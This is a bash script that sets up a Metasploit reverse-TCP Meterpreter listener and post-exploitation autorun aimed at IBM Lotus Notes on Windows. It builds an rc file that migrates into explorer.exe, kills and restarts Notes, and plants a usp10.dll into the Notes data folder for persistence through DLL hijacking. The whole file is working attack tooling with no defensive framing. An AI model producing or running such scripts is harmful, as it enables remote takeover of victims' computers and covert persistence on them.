#!/bin/bash
clear
echo "***************************************************************"
echo "       Automatic  shellcode generator - FOR METASPLOIT         "
echo "         Metasploit custom listener for Lotus Notes            "
echo "***************************************************************"
echo -e "What IP are we gonna listen to ?  \c"
read host
echo -e "What Port Number are we gonna listen to? : \c"
read port

echo "Starting the meterpreter listener.."
echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST  ' > run.listener.sh 

echo -n $host >> run.listener.sh 
echo -n '; set LPORT ' >> run.listener.sh 
echo -n $port >> run.listener.sh 

#Prepare an autorun rc script for metasploit
echo 'migrate -N explorer.exe' > /tmp/migrate.rc 
echo ' cd %LOCALAPPDATA%' >> /tmp/migrate.rc 
echo ' cd IBM' >> /tmp/migrate.rc 
echo ' cd Notes' >> /tmp/migrate.rc 
echo ' cd Data ' >> /tmp/migrate.rc
echo ' rm usp10.dll' >> /tmp/migrate.rc 
echo ' run notes-kill' >> /tmp/migrate.rc 
echo " execute -c -f 'C:\Program Files (x86)\IBM\Notes\notes.exe'" >> /tmp/migrate.rc 
# Stupid wait trick to buy some time for NLNOTES.EXE to load properly before we re-upload usp10.dll
echo ' cd %LOCALAPPDATA%' >> /tmp/migrate.rc
echo ' cd IBM' >> /tmp/migrate.rc
echo ' cd Notes' >> /tmp/migrate.rc
echo ' cd Data ' >> /tmp/migrate.rc
echo ' cd %LOCALAPPDATA%' >> /tmp/migrate.rc
echo ' cd IBM' >> /tmp/migrate.rc
echo ' cd Notes' >> /tmp/migrate.rc
echo ' cd Data ' >> /tmp/migrate.rc
echo ' cd %LOCALAPPDATA%' >> /tmp/migrate.rc
echo ' cd IBM' >> /tmp/migrate.rc
echo ' cd Notes' >> /tmp/migrate.rc
echo ' cd Data ' >> /tmp/migrate.rc

# Lets drop the usp10.dll again for for persistance 
echo ' upload usp10.dll' >> /tmp/migrate.rc

# And move to desktop 
echo ' cd %userprofile%' >> /tmp/migrate.rc
echo ' cd Desktop' >> /tmp/migrate.rc  

# Set the runtime options for autorun 
echo -n ';set AutoRunScript  multi_console_command -rc /tmp/migrate.rc ' >> run.listener.sh
echo -n '; run"' >> run.listener.sh  
chmod +x run.listener.sh 
./run.listener.sh 
